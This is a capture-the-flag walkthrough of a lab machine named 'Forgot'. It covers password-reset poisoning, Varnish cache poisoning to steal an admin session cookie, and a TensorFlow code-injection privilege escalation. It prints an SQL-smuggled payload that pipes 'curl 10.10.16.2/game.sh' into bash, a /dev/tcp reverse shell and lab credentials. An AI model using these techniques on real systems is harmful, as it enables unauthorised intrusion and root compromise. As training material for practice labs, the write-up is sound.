# Forgot

---

## Enumeration

- nmap:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
```

- Forgot password poisoning: https://book.hacktricks.xyz/pentesting-web/reset-password, https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

- username: 'robert-dev-14522' in source:

```zsh
curl $IP | grep by
```

- To steal the reset password token, I started nc listener and intercepted the request, changed the host to myIP:9000

```zsh
nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.249.191] 34506
GET /reset?token=QzQ+7x4zUoJwaGJxYa6aAQdWG8pIlUmaneaCT/vmhYYzMG+oW5leRAkYD1qcbPI3gF6+/PbL6FzKZtCTYtDPJw== HTTP/1.1
Host: 10.10.16.23:9000
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

- Now head to /reset and rest the password using this token

---

## Foothold

- Found disabled link `/admin_tickets`, Had no access to it initially but changing the Auth header username to be admin with same password got me into this page

### UPDATE!!!

- Coming back to this box after a while, the `Authorization: Basic <b64 creds>` path has been patched. So I went back to try the things I tried at first
- After some trial and error I went to `/escalate` page and I tried to steal admin's session cookies, but the word `http` is filtered, I'm guessing it's a `if 'http' in link.lower()` something in Python check. can't seem to be able to bypass it
- I started reading about these cookies and how it handles the session of a logged in user, I still don't fully understand what's happening here, because when I visit a non-existing page on the website, the server sends `Set-Cookie` header setting the session cookie to the same session I had, even if I'm not logged in. I tried restarting the box to see if this behavior is normal and it is!
- I then started googling some response headers especially that `X-Varnish` header and It's some sort of caching technology, and It might be vulnerable to cache poisoning based on my findings
- After some digging, I think the way it uses cache is by caching the response itself, that's why when I tried a link that does not exist, I got the `Set-Cookie` header that was set to the first person who tried accessing this page, and since the admin did, the server set their cookie to the admin session cookie, that's why when I access this page, the server sends the cached response to me which contains `Set-Cookie: session=<admin_session>`
- I modified the ticket's link to `http://10.10.11.188/static/images/test.png` in the `escalate` post request, and waited until the admin visited this page. I then used `curl` on it and I got a session cookie, adding it to my browser cookies and now I can read `/admin_tickets` page.

```zsh
curl -vvv http://10.10.11.188/static/images/test.png

*   Trying 10.10.11.188:80...
* Connected to 10.10.11.188 (10.10.11.188) port 80 (#0)
> GET /static/images/test.png HTTP/1.1
> Host: 10.10.11.188
> User-Agent: curl/7.86.0
> Accept: */*
> 

...

< Set-Cookie: session=1a3c4cd0-25dc-4596-a15e-6c23d14c570f; HttpOnly; Path=/

...

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
* Connection #0 to host 10.10.11.188 left intact
```

- Creds: `diego:dCb#1!x0%gjq`
- Copying these creds from the rendered web page did not work, because of this capitalization, and it capitalizes the 'G' after '%', so copying it from the page source was correct and now I'm as user `Diego` and got `user.txt`
- I was curious what was going on on the `/escalate` filters, here's the functionality, and as I expected, it was a silly python check `if 'http' in link.lower():`

```python
@app.route('/escalate', methods=['GET','POST'])
@login_required
def escalate():
        if request.method=='GET':
                conn.reconnect()
                c = conn.cursor()
                c.execute('select * from tickets')
                r = c.fetchall()
                return render_template('escalate.html',tickets=r)
        else:
                to = request.form.get('to')
                link = request.form.get('link')
                issue = request.form.get('issue')
                reason = request.form.get('reason')
                if 'http' in link.lower():
                        ip = link.split('/')[2]
                        tun_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
                        if ip!=tun_ip:
                                return 'This request can\'t be reviewed since the issue link is flagged'
                conn.reconnect()
                c = conn.cursor()
                c.execute('insert into escalate values(%s,%s,%s,%s)',(to,issue,link,reason,))
                conn.commit()
                return 'Escalation form submitted to Admin and will be reviewed soon!'
```

- Also got admin creds from `bot.py`: `admin:dCvbgFh345_368352c@!`

---

## Privilege Escalation

- I found a path to PE right away and I didn't have to run linpeas or anything

```bash
diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```

- Reading through this, It's using tensorflow `saved_model_cli` and it's vulnerable to code injection, found [this](https://github.com/advisories/GHSA-75c9-jrh4-79mc) github article
- To test this as a poc, I had the creds to the database from `app.py` and inserted a row to `escalate` table, since it's the injectable field is `reason` in that table in:

```python
# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
```

```sql
INSERT INTO escalate VALUES ('test','test','test','test=exec("""import os\nos.system("curl 10.10.16.2")""")');
```

- And I got a hit back.

```bash
diego@forgot:/opt/security$ sudo -u root /opt/security/ml_security.py 
2022-12-24 09:00:11.986998: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2022-12-24 09:00:11.987093: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
```

```bash
nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.188] 38236
GET / HTTP/1.1
Host: 10.10.16.2
User-Agent: curl/7.68.0
Accept: */*
```

- Now, since I have code execution as root, I can do anything really, I decided to get a reverse shell, 1337
- I prepared a reverse shell paylaod and started an HTTP server, then abused the code injection vulnerability to get this payload and pipe it into bash

```bash
┌──(kali㉿kali)-[~]
└─$ cat game.sh     
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.2/1337 0>&1
┌──(kali㉿kali)-[~]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Code execution:

```sql
INSERT INTO escalate VALUES ('test','test','test', 'test=exec("""import os\nos.system("curl 10.10.16.2/game.sh | bash")""")');
```

- Revshell:

```bash
┌──(kali㉿kali)-[~]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [24/Dec/2022 04:18:04] "GET /game.sh HTTP/1.1" 200 -

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.188] 46362
root@forgot:/dev/shm# which python
which python
root@forgot:/dev/shm# which python3
which python3
/usr/bin/python3
root@forgot:/dev/shm# python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
root@forgot:/dev/shm# ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

root@forgot:/dev/shm# stty rows 39 cols 157
root@forgot:/dev/shm# export TERM=xterm-256color
root@forgot:/dev/shm# 

```

---
